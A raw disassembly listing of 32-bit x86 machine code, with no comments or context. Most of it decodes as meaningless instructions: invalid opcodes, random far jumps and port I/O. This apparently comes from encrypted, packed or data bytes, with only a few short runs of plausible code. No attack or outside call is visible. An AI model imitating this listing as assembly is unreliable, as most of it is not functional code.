  4131e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4131e1:	sar    BYTE PTR [esi],cl
  4131e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4131e4:	mov    esi,0x344e0f2b
  4131e9:	sbb    esp,DWORD PTR [eax]
  4131eb:	xor    BYTE PTR [esi-0xea1cce7],dl
  4131f1:	retf   
  4131f2:	nop
  4131f3:	fisubr DWORD PTR [ebx]
  4131f5:	retf   0x74b2
  4131f8:	mov    esi,0xc1f49e19
  4131fd:	dec    esi
  4131fe:	jg     0x41326c
  413200:	loope  0x413261
  413202:	fcomp  st(6)
  413204:	pushf  
  413205:	sub    esp,DWORD PTR [ebp+0x77970935]
  41320b:	imul   esi,DWORD PTR [edi-0x617a46d],0xed489975
  413215:	jmp    0xbf3d:0xd68fa156
  41321c:	stos   DWORD PTR es:[edi],eax
  41321d:	push   ebp
  41321e:	mov    cl,0xb4
  413220:	mov    bl,0x43
  413222:	scas   al,BYTE PTR es:[edi]
  413223:	inc    esi
  413224:	sub    eax,0xabeb05f4
  413229:	cmp    al,cl
  41322b:	mov    esp,0x7680d165
  413230:	sub    dh,BYTE PTR ds:0x2217646f
  413236:	out    dx,eax
  413237:	fimul  WORD PTR [ecx-0x4d]
  41323a:	data16 je 0x413283
  41323d:	test   BYTE PTR [ecx-0x6a47af85],ch
  413243:	scas   al,BYTE PTR es:[edi]
  413244:	iret   
  413245:	js     0x41329d
  413247:	xor    al,0x63
  413249:	fsubrp st(3),st
  41324b:	push   cs
  41324c:	daa    
  41324d:	(bad)  
  41324e:	or     ch,bl
  413250:	scas   eax,DWORD PTR es:[edi]
  413251:	xchg   ebx,eax
  413252:	lods   eax,DWORD PTR ds:[esi]
  413253:	out    0x2d,al
  413255:	outs   dx,DWORD PTR ds:[esi]
  413256:	enter  0xab98,0xfa
  41325a:	mov    esi,0x4d319ed7
  41325f:	int    0xc2
  413261:	and    BYTE PTR [edi-0x32a10413],dl
  413267:	out    0x53,al
  413269:	pushf  
  41326a:	(bad)
  41326d:	arpl   WORD PTR [ecx-0x20],dx
  413270:	xor    eax,0xa99d6635
  413275:	ins    BYTE PTR es:[edi],dx
  413276:	inc    eax
  413277:	xchg   ecx,eax
  413278:	test   BYTE PTR [edi-0x75],0x2d
  41327c:	fild   WORD PTR [ecx+edi*8]
  41327f:	mov    bl,0x12
  413281:	lods   al,BYTE PTR ds:[esi]
  413282:	jae    0x4132ea
  413284:	sub    al,0x77
  413286:	dec    edx
  413287:	push   ss
  413288:	data16 mov cl,0x81
  41328b:	adc    DWORD PTR [edx+0x2707615d],eax
  413291:	arpl   si,bp
  413293:	(bad)  
  413294:	adc    DWORD PTR [ebx+0x2d],edi
  413297:	pop    esi
  413298:	(bad)  
  413299:	or     al,0x4a
  41329b:	cwde   
  41329c:	fimul  DWORD PTR [esi+0x26]
  41329f:	sbb    bh,BYTE PTR [ecx]
  4132a1:	push   cs
  4132a2:	xchg   esp,eax
  4132a3:	call   0xda37:0x6bffee6f
  4132aa:	dec    edx
  4132ab:	cld    
  4132ac:	test   eax,0x759e164a
  4132b1:	sti    
  4132b2:	sub    DWORD PTR [edx],0xe3433904
  4132b8:	jnp    0x413320
  4132ba:	imul   cl
  4132bc:	mov    bh,0xa5
  4132be:	shl    DWORD PTR [ebp+0x3b],cl
  4132c1:	xlat   BYTE PTR ds:[ebx]
  4132c2:	sub    DWORD PTR [edx+0x4f451c4b],ebp
  4132c8:	mov    BYTE PTR [edx],dh
  4132ca:	leave  
  4132cb:	(bad)  
  4132cc:	fadd   DWORD PTR [edx+0x5c608ae5]
  4132d2:	xchg   esi,eax
  4132d3:	jmp    0x31fddabd
  4132d8:	int    0x38
  4132da:	jge    0x41330a
  4132dc:	add    al,0x22
  4132de:	das    
  4132df:	xchg   esi,eax
  4132e0:	test   eax,0x5387b043
  4132e5:	xchg   edx,eax
  4132e6:	imul   ebx,ecx,0xffffffcf
  4132e9:	daa    
  4132ea:	lahf   
  4132eb:	cmp    eax,0x85fbccdb
  4132f0:	dec    esp
  4132f1:	mov    ds:0x529edff6,al
  4132f6:	mov    bl,0x12
  4132f8:	aas    
  4132f9:	call   0x2846:0x4e926a92
  413300:	(bad)  
  413301:	lds    edi,FWORD PTR [esi+0x43fee38e]
  413307:	lahf   
  413308:	xchg   edx,eax
  413309:	xchg   edx,eax
  41330a:	fbstp  TBYTE PTR [ebx-0x3b]
  41330d:	inc    ebx
  41330e:	pop    ds
  41330f:	xchg   edx,eax
  413310:	push   es
  413311:	push   DWORD PTR [ebx-0x46]
  413314:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413316:	leave  
  413317:	sub    eax,0xed73696a
  41331c:	nop
  41331d:	jo     0x413369
  41331f:	adc    BYTE PTR cs:[edi+0x692aa424],0x22
  413327:	sbb    ebp,DWORD PTR [esp+edi*8]
  41332a:	sbb    eax,0x870b95a0
  41332f:	sub    BYTE PTR [ebx],cl
  413331:	lods   al,BYTE PTR ds:[esi]
  413332:	(bad)  
  413333:	popa   
  413334:	sar    DWORD PTR [edi-0x5f8bbd4f],0x6f
  41333b:	imul   ecx,DWORD PTR [ecx+0x4a86c30],0xffffffca
  413342:	scas   eax,DWORD PTR es:[edi]
  413343:	imul   esi,DWORD PTR [edx+ebx*4+0x24fcf67f],0xfffffff2
  41334b:	adc    bh,BYTE PTR [esi]
  41334d:	and    eax,0x7c46197d
  413352:	stos   DWORD PTR es:[edi],eax
  413353:	mov    ds:0xbc77dd2e,al
  413358:	hlt    
  413359:	or     BYTE PTR [edx+eax*2-0x72b69123],al
  413360:	mov    ebp,0xad54a2e2
  413365:	mov    bh,0xbc
  413367:	(bad)  
  413368:	xor    cl,ah
  41336a:	dec    ebx
  41336b:	jmp    0xc862b84c
  413370:	and    DWORD PTR ds:0x466e6a02,esi
  413376:	adc    ebp,eax
  413378:	xchg   BYTE PTR [eax+0x2bec43b6],bl
  41337e:	sbb    ebp,edx
  413380:	sub    bl,BYTE PTR [edx-0x3df9a278]
  413386:	das    
  413387:	pop    esp
  413388:	mov    ah,0x45
  41338a:	ror    DWORD PTR [ecx+0x3556a016],1
  413390:	jp     0x4133ff
  413392:	stc    
  413393:	add    edi,edi
  413395:	dec    ebp
  413396:	ret    0xc119
  413399:	aaa    
  41339a:	xor    bh,0xbe
  41339d:	xor    ebp,edx
  41339f:	lock mov esi,0xaf337b0b
  4133a5:	pop    ebx
  4133a6:	in     al,dx
  4133a7:	mov    al,BYTE PTR [ebx-0x37f698d3]
  4133ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4133ae:	mov    ds:0xa1e282bc,eax
  4133b3:	(bad)  
  4133b4:	mov    esp,0x65837630
  4133b9:	inc    edx
  4133ba:	xchg   esp,eax
  4133bb:	daa    
  4133bc:	jl     0x41342b
  4133be:	push   esp
  4133bf:	pop    ebp
  4133c0:	push   ss
  4133c1:	pop    es
  4133c2:	loop   0x413361
  4133c4:	mov    eax,0x295bdacf
  4133c9:	and    DWORD PTR [ebx-0x71],ecx
  4133cc:	dec    DWORD PTR [edx+0xf4898e6]
  4133d2:	push   cs
  4133d3:	ja     0x413379
  4133d5:	mov    ch,0x80
  4133d7:	in     eax,dx
  4133d8:	or     DWORD PTR [esi+0x3aede7a1],edi
  4133de:	xchg   ecx,eax
  4133df:	xchg   ah,ah
  4133e1:	push   0x74f1983e
  4133e6:	push   es
  4133e7:	repnz fsubrp st(4),st
  4133ea:	inc    ebx
  4133eb:	fisub  WORD PTR [edx+edi*2]
  4133ee:	inc    esp
  4133ef:	loopne 0x41342f
  4133f1:	add    BYTE PTR [edi],bh
  4133f3:	ja     0x4133dd
  4133f5:	cmc    
  4133f6:	mov    ds:0xf366c5cc,al
  4133fb:	mov    bh,0xae
  4133fd:	add    BYTE PTR [edx+0x71c61e9f],dh
  413403:	lods   al,BYTE PTR ds:[esi]
  413404:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413405:	sub    bl,0xfd
  413408:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413409:	cs xchg ebp,eax
  41340b:	add    DWORD PTR [edx+0x8ae41aa],0x28
  413412:	mov    al,ds:0xf8cceb8c
  413417:	push   esi
  413418:	mov    bl,0x31
  41341a:	mov    eax,edi
  41341c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41341d:	sub    eax,0xb010206e
  413422:	dec    edx
  413423:	push   0x1131ee0
  413428:	dec    edx
  413429:	pop    ebx
  41342a:	(bad)  
  41342c:	lds    esi,FWORD PTR [edx+0x51]
  41342f:	pop    ss
  413430:	fwait
  413431:	sub    eax,0xe847e11d
  413436:	in     eax,dx
  413437:	(bad)  
  413438:	jg     0x4133ff
  41343a:	push   ecx
  41343b:	cdq    
  41343c:	popa   
  41343d:	fwait
  41343e:	pop    esi
  41343f:	imul   DWORD PTR [edx-0x734b214e]
  413445:	lea    edi,[eax+0x132ff8c4]
  41344b:	cs jp  0x41343c
  41344e:	cs ins BYTE PTR es:[edi],dx
  413450:	shl    DWORD PTR [edx-0x672c5617],cl
  413456:	xchg   esi,eax
  413457:	sbb    dh,dh
  413459:	xor    esi,DWORD PTR [ebx+0x67]
  41345c:	mov    ecx,0x2eab4044
  413461:	push   ecx
  413462:	and    DWORD PTR ds:0x7a40971a,ebp
  413468:	fsubrp st(5),st
  41346a:	mov    DWORD PTR ds:0x60ca61c6,edi
  413470:	jmp    0x7f690e83
  413475:	inc    ebx
  413476:	jmp    0xa5a4:0x1d6a4de5
  41347d:	xchg   BYTE PTR [ebp+0x6cfb3f5b],ah
  413483:	xchg   edx,eax
  413484:	ss jb  0x4134c7
  413487:	test   al,0x41
  413489:	leave  
  41348a:	out    0x79,al
  41348c:	pop    es
  41348d:	cmp    BYTE PTR [ebx],bh
  41348f:	mov    dh,0xaa
  413491:	icebp  
  413492:	pop    es
  413493:	pushf  
  413494:	push   ebp
  413495:	mov    esp,0x16889aec
  41349a:	or     eax,0xa26b61c1
  41349f:	xlat   BYTE PTR ds:[ebx]
  4134a0:	cli    
  4134a1:	mov    ah,0xbf
  4134a3:	cmp    al,0x45
  4134a5:	adc    edx,0x9573
  4134ab:	push   0x12613
  4134b0:	push   0xae21daec
  4134b5:	push   edx
  4134b6:	push   eax
  4134b7:	call   0x422046
  4134bc:	mov    ecx,eax
  4134be:	mov    eax,DWORD PTR [ebp-0x20]
  4134c1:	jmp    0x413899
  4134c6:	or     eax,0x221ac45b
  4134cb:	sbb    ch,BYTE PTR [edx+0x1b]
  4134ce:	jmp    DWORD PTR [edx-0x6cca8f61]
  4134d4:	gs mov esp,0x18184264
  4134da:	stos   BYTE PTR es:[edi],al
  4134db:	adc    bl,BYTE PTR [eax]
  4134dd:	sbb    BYTE PTR [ecx-0xd],dl
  4134e0:	cmp    ebx,edi
  4134e2:	sbb    ah,BYTE PTR [edx]
  4134e4:	cmp    dh,al
  4134e6:	pusha  
  4134e7:	mov    dl,0x21
  4134e9:	cmp    ax,0x243d
  4134ed:	(bad)  
  4134ee:	push   esp
  4134ef:	pop    ebp
  4134f0:	in     eax,dx
  4134f1:	aam    0x1e
  4134f3:	mov    eax,ds:0x6c83586d
  4134f8:	pushf  
  4134f9:	xor    BYTE PTR [eax],al
  4134fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4134fc:	xor    bl,0xb2
  4134ff:	(bad)  
  413500:	div    BYTE PTR [ebp-0x1b]
  413503:	mov    edx,0x5efe5709
  413509:	or     esi,DWORD PTR [edi+edi*8-0x66ed1067]
  413510:	fdiv   QWORD PTR [ebp+0x59]
  413513:	dec    ebx
  413514:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413515:	(bad)  
  413516:	adc    edi,DWORD PTR [esi-0x71523f10]
  41351c:	ja     0x41351d
  41351e:	sub    DWORD PTR [esi],edx
  413520:	iret   
  413521:	adc    DWORD PTR [ebx-0x41],edx
  413524:	xor    eax,0x52f2db77
  413529:	mov    ebp,DWORD PTR ds:0x56ef2958
  41352f:	sub    eax,0x95a6fee8
  413534:	into   
  413535:	mov    dh,0xde
  413537:	out    0xeb,al
  413539:	mov    ah,0xf7
  41353b:	adc    al,0x22
  41353d:	pop    eax
  41353e:	sub    al,0xa7
  413540:	popf   
  413541:	xor    eax,DWORD PTR [edx]
  413543:	adc    edi,ecx
  413545:	sar    BYTE PTR [edx-0x183d3bbd],0x5a
  41354c:	dec    eax
  41354d:	inc    edi
  41354e:	cmp    BYTE PTR [esi+0x5857326],dl
  413554:	jnp    0x4134eb
  413556:	jbe    0x413515
  413558:	cmc    
  413559:	mov    edx,0xdb3a9025
  41355e:	mov    ss,WORD PTR [esi]
  413560:	js     0x413548
  413562:	mov    es,WORD PTR [ebx-0x76]
  413565:	xchg   ebp,eax
  413566:	fsubr  st(1),st
  413568:	or     bl,0x1e
  41356b:	inc    ebx
  41356c:	cmc    
  41356d:	push   edx
  41356e:	test   DWORD PTR [eax+0x15aa2f39],edi
  413574:	inc    esi
  413575:	push   cs
  413576:	popa   
  413577:	sbb    edx,DWORD PTR [ebp+0xf55ce46]
  41357d:	adc    BYTE PTR [edx],bl
  41357f:	or     ebp,DWORD PTR [eax]
  413581:	imul   eax,eax,0x9
  413584:	fidivr WORD PTR [eax+ebp*8]
  413587:	jl     0x4135d3
  413589:	scas   al,BYTE PTR es:[edi]
  41358a:	sbb    eax,0xed19f407
  41358f:	sbb    BYTE PTR [ebp+0xb],ah
  413592:	fsubr  st(3),st
  413594:	inc    edx
  413595:	sahf   
  413596:	into   
  413597:	lahf   
  413598:	or     eax,0x66804473
  41359d:	sub    DWORD PTR [edx-0x11],esi
  4135a0:	xor    dl,BYTE PTR [esi]
  4135a2:	(bad)  
  4135a3:	jmp    0xd2b:0x5c37cc83
  4135aa:	sbb    eax,0xe5c25c99
  4135af:	stos   DWORD PTR es:[edi],eax
  4135b0:	imul   DWORD PTR [ebx]
  4135b2:	mov    ah,BYTE PTR [ebp+0x3e]
  4135b5:	jb     0x4135b6
  4135b7:	ret    
  4135b8:	mov    BYTE PTR [ebp+0x4e],dl
  4135bb:	adc    DWORD PTR [edx+0x17],eax
  4135be:	fidiv  WORD PTR [edi]
  4135c0:	mov    esi,0xe0f713b6
  4135c5:	cmp    esp,DWORD PTR [ebx-0x58]
  4135c8:	enter  0x8e22,0x9a
  4135cc:	adc    DWORD PTR [ecx+edx*4],esp
  4135cf:	scas   eax,DWORD PTR es:[edi]
  4135d0:	jmp    0x87e8:0x7db30bbc
  4135d7:	push   eax
  4135d8:	das    
  4135d9:	(bad)  
  4135da:	cmp    DWORD PTR [ebp-0x12],edx
  4135dd:	repz stc 
  4135df:	loopne 0x4135ce
  4135e1:	shl    DWORD PTR [edx-0x4367e544],0x2f
  4135e8:	cwde   
  4135e9:	scas   al,BYTE PTR es:[edi]
  4135ea:	or     edx,DWORD PTR [ebp+eiz*1-0x67]
  4135ee:	push   ecx
  4135ef:	adc    eax,0xeac7509c
  4135f4:	inc    esi
  4135f5:	hlt    
  4135f6:	inc    ebx
  4135f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4135f8:	fadd   DWORD PTR [eax-0x2837921c]
  4135fe:	sub    eax,0x52e71010
  413603:	add    DWORD PTR [edx+ebp*4-0x31e94da2],esi
  41360a:	mov    ?,WORD PTR [edx]
  41360c:	cwde   
  41360d:	cmp    al,0x2a
  41360f:	xor    al,0xdc
  413611:	call   0x79adaa45
  413616:	cld    
  413617:	(bad)  
  413618:	pusha  
  413619:	sti    
  41361a:	inc    edi
  41361b:	dec    edi
  41361c:	in     eax,0xd4
  41361e:	push   ds
  41361f:	retf   
  413620:	or     DWORD PTR [edx],ebx
  413622:	vandpd ymm6,ymm1,YMMWORD PTR [esi-0xc]
  413627:	mov    ebx,0x4b698a8
  41362c:	daa    
  41362d:	adc    al,0xf5
  41362f:	in     eax,0xea
  413631:	dec    edi
  413632:	lods   eax,DWORD PTR ds:[esi]
  413633:	outs   dx,BYTE PTR ds:[esi]
  413634:	pop    eax
  413635:	fisttp QWORD PTR ds:0x279867ec
  41363b:	inc    esi
  41363c:	sbb    BYTE PTR [eax+0x32941598],al
  413642:	pusha  
  413643:	xchg   esp,eax
  413644:	int    0xba
  413646:	mov    ah,0xe4
  413648:	sub    BYTE PTR [edi+0x7c1b6474],ah
  41364e:	adc    ch,BYTE PTR [ecx+0x76]
  413651:	push   ebx
  413652:	pop    edi
  413653:	out    0x10,al
  413655:	gs or  bh,BYTE PTR fs:[esi+0xb]
  41365a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41365b:	sbb    eax,0xfab09ff7
  413660:	ins    DWORD PTR es:[edi],dx
  413661:	pop    esi
  413662:	xchg   ecx,eax
  413663:	mov    ah,0x9b
  413665:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413666:	popw   es
  413668:	imul   ebx,edi,0x70461048
  41366e:	push   edx
  41366f:	test   al,0x38
  413671:	repz mov bh,0xb
  413674:	mov    al,0xa2
  413676:	mov    al,0x65
  413678:	shr    dl,1
  41367a:	push   cs
  41367b:	stos   DWORD PTR es:[edi],eax
  41367c:	lds    edx,FWORD PTR [ebp+ecx*4+0x68]
  413680:	shl    dh,cl
  413682:	mov    dh,0x76
  413684:	jno    0x4136b6
  413686:	(bad)  
  413687:	jmp    DWORD PTR [ebp+0x3d]
  41368a:	inc    ecx
  41368b:	jle    0x413698
  41368d:	das    
  41368e:	push   ecx
  41368f:	nop
  413690:	dec    eax
  413691:	add    dh,BYTE PTR [edi]
  413693:	inc    edi
  413694:	int3   
  413695:	jb     0x41370c
  413697:	fcom   QWORD PTR [edx+0x5df1a057]
  41369d:	push   esp
  41369e:	(bad)  
  41369f:	daa    
  4136a0:	inc    esi
  4136a1:	sahf   
  4136a2:	xchg   esp,eax
  4136a3:	js     0x413673
  4136a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4136a6:	mov    ds:0xb449f148,eax
  4136ab:	ret    0xc6f3
  4136ae:	aaa    
  4136af:	adc    ecx,DWORD PTR [esi]
  4136b1:	sbb    BYTE PTR [ebx-0x6b6c045c],al
  4136b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4136b8:	fmul   QWORD PTR [edi+0x4e9363b1]
  4136be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4136bf:	inc    ebx
  4136c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4136c1:	inc    edx
  4136c2:	sahf   
  4136c3:	sub    dl,0xe0
  4136c6:	push   esp
  4136c7:	push   ds
  4136c8:	push   ds
  4136c9:	sbb    DWORD PTR [edi],0xb5661856
  4136cf:	xor    BYTE PTR ds:0xa3987d51,ch
  4136d5:	jb     0x413747
  4136d7:	jmp    0xdd58:0x6e793553
  4136de:	adc    DWORD PTR [edi-0x75a14019],esp
  4136e4:	sbb    bl,al
  4136e6:	jp     0x4136a4
  4136e8:	push   DWORD PTR [ebp+0x2f7b6b6b]
  4136ee:	out    dx,eax
  4136ef:	mov    ecx,0x9bfa6568
  4136f4:	dec    edi
  4136f5:	or     esi,ebp
  4136f7:	arpl   WORD PTR [eax-0x4a],dx
  4136fa:	fild   DWORD PTR [ecx+edi*4+0x68]
  4136fe:	push   esi
  4136ff:	xchg   esp,eax
  413700:	mov    ebx,0xae6e61f9
  413705:	shl    DWORD PTR [esi+0x2f94978f],cl
  41370b:	push   cs
  41370c:	inc    esp
  41370d:	clc    
  41370e:	js     0x413748
  413710:	mov    WORD PTR [ebx+ecx*2+0x4339c765],es
  413717:	xchg   BYTE PTR [ecx-0x67],bl
  41371a:	push   esp
  41371b:	add    eax,0x9ec7e4f3
  413720:	mov    ebp,0x6a83e2b9
  413725:	mov    BYTE PTR [ebp+0x3f],dh
  413728:	cmp    ebp,ebx
  41372a:	imul   edx,DWORD PTR [ebp+0x318fc0c7],0x4f6d34d3
  413734:	sbb    esp,ecx
  413736:	shl    DWORD PTR [esi],1
  413738:	daa    
  413739:	loope  0x4136fa
  41373b:	xchg   ecx,eax
  41373c:	cdq    
  41373d:	mov    ch,BYTE PTR [ebx+0x41fc4052]
  413743:	cmp    cl,BYTE PTR cs:[esi+eiz*1]
  413747:	pusha  
  413748:	sub    cl,0xdc
  41374b:	repnz xor BYTE PTR [ebp+0x51d1117e],ch
  413752:	pop    edi
  413753:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413754:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413755:	mov    ds:0x6747ef1c,eax
  41375a:	jno    0x4137a6
  41375c:	pushf  
  41375d:	sbb    al,BYTE PTR [ecx+0x6408cfe6]
  413763:	inc    eax
  413764:	sbb    edx,DWORD PTR ds:0x65888cf6
  41376a:	sbb    DWORD PTR [ebx-0x5c31191a],ebp
  413770:	dec    ebp
  413771:	lock in eax,dx
  413773:	into   
  413774:	lods   al,BYTE PTR ds:[esi]
  413775:	jmp    0x89f1:0x16570f2b
  41377c:	inc    esi
  41377d:	fnstcw WORD PTR [ebx+0x14766b08]
  413783:	lds    ebx,FWORD PTR [ecx]
  413785:	inc    ecx
  413786:	loop   0x4137e8
  413788:	(bad)  
  413789:	jbe    0x4137ee
  41378b:	lahf   
  41378c:	jb     0x4137ae
  41378e:	xchg   ecx,eax
  41378f:	ret    0xc93c
  413792:	mov    ah,ch
  413794:	shr    BYTE PTR [ecx],1
  413796:	in     al,0x92
  413798:	adc    ah,BYTE PTR [eax-0x17]
  41379b:	jno    0x41376a
  41379d:	bnd jne 0x413785
  4137a0:	pusha  
  4137a1:	mov    ecx,0xa395daa1
  4137a6:	cmp    ebp,DWORD PTR [ecx+eax*4]
  4137a9:	dec    eax
  4137aa:	and    edx,DWORD PTR [edi+0x11]
  4137ad:	and    BYTE PTR [ebx],ah
  4137af:	pop    es
  4137b0:	dec    ebx
  4137b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4137b2:	or     bl,BYTE PTR [eax-0x54cfc53]
  4137b8:	xor    al,0x4e
  4137ba:	arpl   WORD PTR [esi-0x31],si
  4137bd:	jo     0x4137d5
  4137bf:	mov    dl,0x97
  4137c1:	inc    edi
  4137c2:	push   ds
  4137c3:	xor    ecx,ecx
  4137c5:	outs   dx,DWORD PTR ds:[esi]
  4137c6:	test   BYTE PTR [ebx+ebx*2],bh
  4137c9:	dec    eax
  4137ca:	btc    DWORD PTR [eax-0x56861970],edi
  4137d1:	ins    DWORD PTR es:[edi],dx
  4137d2:	push   ebp
  4137d3:	mov    ch,0xaf
  4137d5:	sub    BYTE PTR [ebp-0xe],0x17
  4137d9:	adc    al,0x4b
  4137db:	push   0xffffffe5
  4137dd:	xor    edi,DWORD PTR [ebp-0x6c]
  4137e0:	cld    
  4137e1:	es std 
  4137e3:	mov    edi,DWORD PTR [esi]
  4137e5:	lahf   
  4137e6:	bound  esi,QWORD PTR [edi+0x49b41e3a]
  4137ec:	test   DWORD PTR [edx+ebp*8-0x55],0x5cebe8e7
  4137f4:	or     eax,0xd3149b90
  4137f9:	stos   DWORD PTR es:[edi],eax
  4137fa:	jae    0x4137b9
  4137fc:	jge    0x41380d
  4137fe:	add    BYTE PTR [ecx],dl
  413800:	imul   esi,DWORD PTR [ecx-0x4b],0x23
  413804:	adc    BYTE PTR [ebx-0x21],dh
  413807:	pop    ebx
  413808:	pop    ecx
  413809:	rol    eax,1
  41380b:	add    dl,bl
  41380d:	test   al,0xe
  41380f:	and    DWORD PTR [ebx+0x3c],eax
  413812:	mov    bh,0xf4
  413814:	xor    dh,BYTE PTR [edi+0x3fdd2191]
  41381a:	adc    DWORD PTR [edi],0xffffffb1
  41381d:	sub    al,0x2f
  41381f:	pop    edi
  413820:	fld    DWORD PTR [ebp+0x13a01d6c]
  413826:	or     al,0xac
  413828:	push   cs
  413829:	inc    ebp
  41382a:	sub    DWORD PTR [ecx],esp
  41382c:	xor    al,0xbd
  41382e:	int    0xd2
  413830:	sbb    ebx,edi
  413832:	xchg   ecx,eax
  413833:	push   edi
  413834:	leave  
  413835:	popa   
  413836:	mov    BYTE PTR [edx+eax*8],ah
  413839:	or     BYTE PTR [ebp-0x30],al
  41383c:	jns    0x413803
  41383e:	sub    BYTE PTR [eax+0x49e07368],al
  413844:	mov    BYTE PTR [edi+0x78e9fd87],0x15
  41384b:	clc    
  41384c:	inc    ebx
  41384d:	pop    esi
  41384e:	hlt    
  41384f:	mov    al,ds:0x54acf611
  413854:	add    al,0xbe
  413856:	shl    bl,cl
  413858:	pushf  
  413859:	sub    al,0x9e
  41385b:	push   ecx
  41385c:	sub    DWORD PTR [edi],0x974af5cf
  413862:	pusha  
  413863:	sub    DWORD PTR [ecx-0x73a0359c],esp
  413869:	xchg   ebx,eax
  41386a:	jl     0x41388d
  41386c:	sahf   
  41386d:	rol    BYTE PTR [edi+0x6d],cl
  413870:	pop    esi
  413871:	mov    eax,ds:0xa87e98cb
  413876:	or     DWORD PTR [esi+0x2ee696e5],0x23
  41387d:	mov    al,ds:0xd708a03d
  413882:	call   0x3b91e9f
  413887:	mov    BYTE PTR [eax],ah
  413889:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41388a:	mov    edx,0xadf1e4fb
  41388f:	test   eax,0x1593e9c1
  413894:	sbb    ah,BYTE PTR [ebp-0x744def66]
  41389a:	pop    ebp
  41389b:	in     al,0x81
  41389d:	icebp  
  41389e:	mov    ebx,DWORD PTR [ebx]
  4138a0:	add    BYTE PTR [eax],al
  4138a2:	xor    edi,edi
  4138a4:	xor    edx,edi
  4138a6:	add    ecx,eax
  4138a8:	mov    eax,DWORD PTR [ebp+0xc]
  4138ab:	adc    edx,ebx
  4138ad:	mov    DWORD PTR [eax],ecx
  4138af:	mov    DWORD PTR [eax+0x4],edx
  4138b2:	mov    eax,DWORD PTR [ebp-0x30]
  4138b5:	mov    ecx,DWORD PTR [ebp-0x2c]
  4138b8:	mov    edx,0xbdb2
  4138bd:	sub    edx,eax
  4138bf:	mov    eax,DWORD PTR [ebp-0x28]
  4138c2:	mov    ebx,0x4c02
  4138c7:	sbb    ebx,ecx
  4138c9:	mov    ecx,DWORD PTR [ebp-0x24]
  4138cc:	sub    edx,eax
  4138ce:	mov    eax,DWORD PTR [ebp+0xc]
  4138d1:	sbb    ebx,ecx
  4138d3:	jmp    0x413cab
  4138d8:	out    0x56,eax
  4138da:	inc    ecx
  4138db:	jp     0x4138fd
  4138dd:	jp     0x413881
  4138df:	sub    bh,BYTE PTR [edx]
  4138e1:	xchg   edx,eax
  4138e2:	cmp    DWORD PTR [edx+0x5a],ebp
  4138e5:	neg    DWORD PTR ds:0x183af77e
  4138eb:	sbb    BYTE PTR [edx+0x76181812],ch
  4138f1:	data16 and bh,dh
  4138f4:	sub    eax,0x2d9c5b0c
  4138f9:	lods   eax,DWORD PTR ds:[esi]
  4138fa:	adc    eax,0x721dfe3b
  4138ff:	test   dl,cl
  413901:	das    
  413902:	sbb    eax,0x1b3cacbe
  413907:	mov    ah,0x8c
  413909:	mov    cl,0x96
  41390b:	fld    QWORD PTR [esi+0x6779d5ac]
  413911:	or     BYTE PTR [edi-0x17f41761],cl
  413917:	mov    ch,0x42
  413919:	sub    ebx,DWORD PTR ds:0x9e0f8323
  41391f:	scas   al,BYTE PTR es:[edi]
  413920:	rcr    BYTE PTR [esi-0x3d96d94d],0x8c
  413927:	test   DWORD PTR [eax],0xfcc0bb9a
  41392d:	xchg   ebx,eax
  41392e:	in     eax,dx
  41392f:	sbb    ebx,DWORD PTR [esi]
  413931:	ror    BYTE PTR [ebp-0x6707afda],1
  413937:	xchg   ebx,eax
  413938:	call   0xb748:0x3019d849
  41393f:	call   0xde60:0x8ae06491
  413946:	sub    eax,0xf5410825
  41394b:	int    0x5a
  41394d:	test   al,0xf0
  41394f:	hlt    
  413950:	repnz adc bl,BYTE PTR [esi-0x5e]
  413954:	pusha  
  413955:	sbb    edx,eax
  413957:	adc    eax,0xf82ab7b7
  41395c:	xchg   edi,eax
  41395d:	cmp    cl,BYTE PTR [ebx+0x256bd407]
  413963:	(bad)  
  413965:	neg    DWORD PTR [esp+ecx*1+0x2d]
  413969:	sbb    ch,dh
  41396b:	int3   
  41396c:	data16 mov ah,0xa9
  41396f:	mov    ds:0x2df8401d,eax
  413974:	into   
  413975:	rcr    BYTE PTR [ebp+0x5c],1
  413978:	pop    ecx
  413979:	cmp    eax,0x7114c186
  41397e:	pop    edx
  41397f:	mov    al,ds:0x15bfedb4
  413984:	xchg   ebx,eax
  413985:	push   0xffffffc8
  413987:	or     al,0xaa
  413989:	and    esp,edx
  41398b:	test   al,0x8d
  41398d:	mov    ecx,0x8c45b6fe
  413992:	fcom   QWORD PTR [ebp-0x63]
  413995:	jae    0x413932
  413997:	mov    bh,0x2
  413999:	ins    BYTE PTR es:[edi],dx
  41399a:	jecxz  0x4139c2
  41399c:	out    0xb8,al
  41399e:	js     0x413965
  4139a0:	xchg   ebx,esi
  4139a2:	add    dl,BYTE PTR [ebx-0x2a65ab92]
  4139a8:	rol    DWORD PTR [edx],0x2c
  4139ab:	lea    ecx,[esp+edi*8+0x69]
  4139af:	fiadd  WORD PTR [ecx]
  4139b1:	mov    al,0x8b
  4139b3:	dec    ebx
  4139b4:	ja     0x4139e2
  4139b6:	stos   BYTE PTR es:[edi],al
  4139b7:	leave  
  4139b8:	ret    
  4139b9:	or     esp,esp
  4139bb:	push   ebp
  4139bc:	jb     0x41394a
  4139be:	lea    eax,[ebx-0x5be71616]
  4139c4:	add    DWORD PTR [edi+0x161bd0dd],ecx
  4139ca:	push   0xffffffdd
  4139cc:	add    eax,0x304486c6
  4139d1:	inc    eax
